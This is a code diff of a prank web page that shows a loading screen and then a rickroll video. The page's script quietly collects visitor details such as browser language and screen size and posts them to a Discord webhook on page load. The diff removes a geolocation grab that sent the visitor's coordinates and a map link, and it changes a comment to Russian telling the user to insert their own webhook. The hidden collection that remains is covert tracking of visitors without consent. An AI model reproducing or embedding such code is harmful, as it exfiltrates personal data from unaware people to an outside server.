@@ -54,11 +54,11 @@
 </div>
 
 <video id="rickrollVideo" loop autoplay muted style="display: none;">
-    <source src="rickroll.mp4" type="video/mp4">
+    <source src="Voicy_rickroll.mp4" type="video/mp4">
 </video>
 
 <script>
-    // ⬇️ Discord Webhook URL
+    // ⬇️ ВСТАВЬ СВОЙ DISCORD WEBHOOK URL ⬇️
     const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/твой/url';
 
     async function sendToDiscord(text) {
@@ -87,25 +87,17 @@
         message += 'Язык: ' + navigator.language + '\n';
         message += 'Экран: ' + screen.width + 'x' + screen.height + '\n';
 
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(pos => {
-                message += 'Координаты: ' + pos.coords.latitude + ', ' + pos.coords.longitude + '\n';
-                message += 'Карта: https://www.google.com/maps?q=' + pos.coords.latitude + ',' + pos.coords.longitude;
-                sendToDiscord(message);
-            }, () => sendToDiscord(message));
-        } else {
-            sendToDiscord(message);
-        }
+        // Геолокация УДАЛЕНА — запросов не будет
+        sendToDiscord(message);
     }
 
     setTimeout(collectAndSend, 1000);
 
-    // Показываем видео через 3 секунды
     setTimeout(() => {
         document.getElementById('loader').style.display = 'none';
         let video = document.getElementById('rickrollVideo');
         video.style.display = 'block';
-        video.muted = false;   // включаем звук
+        video.muted = false;
         video.play();
     }, 3000);
 </script>
